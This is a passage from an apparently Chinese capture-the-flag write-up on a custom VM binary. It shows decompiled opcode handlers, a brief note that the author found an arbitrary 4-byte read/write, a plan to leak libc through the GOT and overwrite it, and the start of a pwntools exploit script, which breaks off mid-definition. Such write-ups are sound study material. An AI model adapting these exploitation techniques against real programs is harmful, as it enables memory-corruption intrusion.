&gt;&gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">      vm-&gt;x -= <span class="number">4</span> * s-&gt;codeval;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">      vm-&gt;x += <span class="number">4</span> * s-&gt;codeval;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) == <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) == <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">LABEL_8:</span><br><span class="line">      <span class="keyword">if</span> ( !LOBYTE(vm-&gt;y) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_4:</span><br><span class="line">        <span class="keyword">if</span> ( (s-&gt;codeval &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">          v2 = vm-&gt;ip - (s-&gt;codeval &amp; <span class="number">0x7FFFFF</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v2 = (s-&gt;codeval &amp; <span class="number">0x7FFFFF</span>) + vm-&gt;ip;</span><br><span class="line">        vm-&gt;ip = v2;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">      vm-&gt;x -= <span class="number">4LL</span>;</span><br><span class="line">      *&amp;vm-&gt;code[vm-&gt;x] = vm-&gt;ip;</span><br><span class="line">      <span class="keyword">if</span> ( (s-&gt;codeval &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">        v3 = vm-&gt;ip - (s-&gt;codeval &amp; <span class="number">0x7FFFFF</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v3 = (s-&gt;codeval &amp; <span class="number">0x7FFFFF</span>) + vm-&gt;ip;</span><br><span class="line">      vm-&gt;ip = v3;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">      rw(s-&gt;codeval, vm-&gt;regs[<span class="number">0</span>], vm-&gt;regs[<span class="number">1</span>], vm-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[<span class="number">0</span>]) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      rw(s-&gt;codeval, LODWORD(vm-&gt;code) + LODWORD(vm-&gt;regs[<span class="number">0</span>]), vm-&gt;regs[<span class="number">1</span>], vm-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[<span class="number">1</span>]) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      rw(s-&gt;codeval, vm-&gt;regs[<span class="number">0</span>], &amp;vm-&gt;code[vm-&gt;regs[<span class="number">1</span>]], vm-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[<span class="number">2</span>]) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      rw(s-&gt;codeval, vm-&gt;regs[<span class="number">0</span>], vm-&gt;regs[<span class="number">1</span>], &amp;vm-&gt;code[vm-&gt;regs[<span class="number">2</span>]]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[<span class="number">0</span>]) || g0x1000(vm-&gt;regs[<span class="number">1</span>]) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      rw(s-&gt;codeval, LODWORD(vm-&gt;code) + LODWORD(vm-&gt;regs[<span class="number">0</span>]), &amp;vm-&gt;code[vm-&gt;regs[<span class="number">1</span>]], vm-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[<span class="number">0</span>]) || g0x1000(vm-&gt;regs[<span class="number">2</span>]) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      rw(s-&gt;codeval, LODWORD(vm-&gt;code) + LODWORD(vm-&gt;regs[<span class="number">0</span>]), vm-&gt;regs[<span class="number">1</span>], &amp;vm-&gt;code[vm-&gt;regs[<span class="number">2</span>]]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[<span class="number">1</span>]) || g0x1000(vm-&gt;regs[<span class="number">2</span>]) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      rw(s-&gt;codeval, vm-&gt;regs[<span class="number">0</span>], &amp;vm-&gt;code[vm-&gt;regs[<span class="number">1</span>]], &amp;vm-&gt;code[vm-&gt;regs[<span class="number">2</span>]]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;:&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[<span class="number">0</span>]) || g0x1000(vm-&gt;regs[<span class="number">1</span>]) || g0x1000(vm-&gt;regs[<span class="number">2</span>]) )</span><br><span class="line">LABEL_27:</span><br><span class="line">        out();</span><br><span class="line">      rw(s-&gt;codeval, LODWORD(vm-&gt;code) + LODWORD(vm-&gt;regs[<span class="number">0</span>]), &amp;vm-&gt;code[vm-&gt;regs[<span class="number">1</span>]], &amp;vm-&gt;code[vm-&gt;regs[<span class="number">2</span>]]);</span><br><span class="line">LABEL_25:</span><br><span class="line">      LODWORD(vm-&gt;regs[<span class="number">0</span>]) = vm + <span class="number">16</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;;&#x27;</span>:</span><br><span class="line">      vm-&gt;ip = *&amp;vm-&gt;code[vm-&gt;x];</span><br><span class="line">      vm-&gt;x += <span class="number">4</span> * (s-&gt;codeval + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">op1</span><span class="params">(vm *vm, x *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( s-&gt;t &gt;&gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">31</span>:</span><br><span class="line">      vm-&gt;x -= <span class="number">4LL</span>;</span><br><span class="line">      *&amp;vm-&gt;code[vm-&gt;x] = vm-&gt;regs[s-&gt;codeval];</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = *&amp;vm-&gt;code[vm-&gt;x];</span><br><span class="line">      vm-&gt;x += <span class="number">4LL</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">      ++vm-&gt;regs[s-&gt;codeval];</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">      --vm-&gt;regs[s-&gt;codeval];</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">35</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = vm-&gt;x;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">41</span>:</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">42</span>:</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">43</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) == <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">44</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">45</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) == <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">46</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">LABEL_8:</span><br><span class="line">      <span class="keyword">if</span> ( !LOBYTE(vm-&gt;y) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">47</span>:</span><br><span class="line">      <span class="keyword">if</span> ( LOBYTE(vm-&gt;y) )</span><br><span class="line">LABEL_7:</span><br><span class="line">        vm-&gt;ip = vm-&gt;regs[s-&gt;codeval];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">48</span>:</span><br><span class="line">      vm-&gt;x -= <span class="number">4LL</span>;</span><br><span class="line">      *&amp;vm-&gt;code[vm-&gt;x] = vm-&gt;ip;</span><br><span class="line">      vm-&gt;ip = s-&gt;codeval;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">op2</span><span class="params">(vm *vm, x *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( s-&gt;t &gt;&gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;regs[s-&gt;codeval] &lt;= vm-&gt;regs[s-&gt;codeval2] )</span><br><span class="line">        LOBYTE(vm-&gt;y) = vm-&gt;regs[s-&gt;codeval] &lt; vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        LOBYTE(vm-&gt;y) = <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;regs[s-&gt;codeval] &lt;= vm-&gt;regs[s-&gt;codeval2] )</span><br><span class="line">        LOBYTE(vm-&gt;y) = vm-&gt;regs[s-&gt;codeval] &lt; vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        LOBYTE(vm-&gt;y) = <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] ^= vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] |= vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] &amp;= vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] &lt;&lt;= vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = vm-&gt;regs[s-&gt;codeval] &gt;&gt; vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">      v2 = vm-&gt;regs[s-&gt;codeval];</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval2] = v2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] += vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] -= vm-&gt;regs[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[s-&gt;codeval2]) )</span><br><span class="line">        out();</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = vm-&gt;code[vm-&gt;regs[s-&gt;codeval2]];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[s-&gt;codeval2]) )</span><br><span class="line">        out();</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = *&amp;vm-&gt;code[vm-&gt;regs[s-&gt;codeval2]];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[s-&gt;codeval2]) )</span><br><span class="line">        out();</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = *&amp;vm-&gt;code[vm-&gt;regs[s-&gt;codeval2]];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[s-&gt;codeval2]) )</span><br><span class="line">        out();</span><br><span class="line">      vm-&gt;code[vm-&gt;regs[s-&gt;codeval2]] = vm-&gt;regs[s-&gt;codeval];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[s-&gt;codeval2]) )</span><br><span class="line">        out();</span><br><span class="line">      *&amp;vm-&gt;code[vm-&gt;regs[s-&gt;codeval2]] = vm-&gt;regs[s-&gt;codeval];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[s-&gt;codeval2]) )</span><br><span class="line">        out();</span><br><span class="line">      *&amp;vm-&gt;code[vm-&gt;regs[s-&gt;codeval2]] = vm-&gt;regs[s-&gt;codeval];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">op3</span><span class="params">(vm *vm, x *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( s-&gt;t &gt;&gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;regs[s-&gt;codeval] &lt;= s-&gt;codeval2 )</span><br><span class="line">        LOBYTE(vm-&gt;y) = vm-&gt;regs[s-&gt;codeval] &lt; s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        LOBYTE(vm-&gt;y) = <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;regs[s-&gt;codeval] &lt;= s-&gt;codeval2 )</span><br><span class="line">        LOBYTE(vm-&gt;y) = vm-&gt;regs[s-&gt;codeval] &lt; s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        LOBYTE(vm-&gt;y) = <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] ^= s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] |= s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] &amp;= s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] &lt;&lt;= s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = vm-&gt;regs[s-&gt;codeval] &gt;&gt; s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] += s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] -= s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(s-&gt;codeval2) )               <span class="comment">// byte</span></span><br><span class="line">        out();</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = vm-&gt;code[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">13</span>:                                    <span class="comment">// word</span></span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(s-&gt;codeval2) )</span><br><span class="line">        out();</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = *&amp;vm-&gt;code[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">14</span>:                                    <span class="comment">// dword</span></span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(s-&gt;codeval2) )</span><br><span class="line">        out();</span><br><span class="line">      vm-&gt;regs[s-&gt;codeval] = *&amp;vm-&gt;code[s-&gt;codeval2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[s-&gt;codeval]) )</span><br><span class="line">        out();</span><br><span class="line">      vm-&gt;code[vm-&gt;regs[s-&gt;codeval]] = s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[s-&gt;codeval]) )</span><br><span class="line">        out();</span><br><span class="line">      *&amp;vm-&gt;code[vm-&gt;regs[s-&gt;codeval]] = s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">      <span class="keyword">if</span> ( g0x1000(vm-&gt;regs[s-&gt;codeval]) )</span><br><span class="line">        out();</span><br><span class="line">      *&amp;vm-&gt;code[vm-&gt;regs[s-&gt;codeval]] = s-&gt;codeval2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">rw</span><span class="params">(<span class="type">int</span> sysnum, <span class="type">int</span> a2, <span class="type">void</span> *a3, <span class="type">size_t</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sysnum == <span class="number">2</span> )</span><br><span class="line">    _exit(a2);</span><br><span class="line">  <span class="keyword">if</span> ( sysnum &gt; <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sysnum )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sysnum != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> write(a2, a3, a4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> read(a2, a3, a4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_BOOL8 __fastcall <span class="title function_">g6</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> val &gt; <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_BOOL8 __fastcall <span class="title function_">sub_401215</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">0x1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_401239</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Insecurity&quot;</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>Vm 题逆向最累了<br>逆出了个大概<br>看到了任意4字节地址读写</p>
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><p>读出 got 表<br>泄露 libc<br>然后改 got 表</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&#x27;./vvmm&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;b *0x401775</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="comment"># gdb.attach(io, sc)</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">op0</span>(<span class="params">c:<span class="built_in">int</span>,x:<span class="built_in">int</span>,y:<span class="built_in">int</span>,z:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    c = c &lt;&lt; <span class="number">2</span></span><br><span class="line">    code += p8(c|<span class="number">0</span>)</span><br><span class="line">    code += p8(x)</span><br><span class="line">    code += p8(y)</span><br><span class="line">    code += p8(z)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">op3</span>(<span class="params">c:<span class="built_in">int</span>,x:<span class="built_in">int</span>,y:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    c = c &lt;&lt; <span class="number">2</span></span><br><span class="line">    code += p8(c|<span class="number">3</span>)</span><br><span class="line">    code += p8(x)</span><br><span class="line">    code += p32(y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_reg</span>(<span class="params">idx:<span 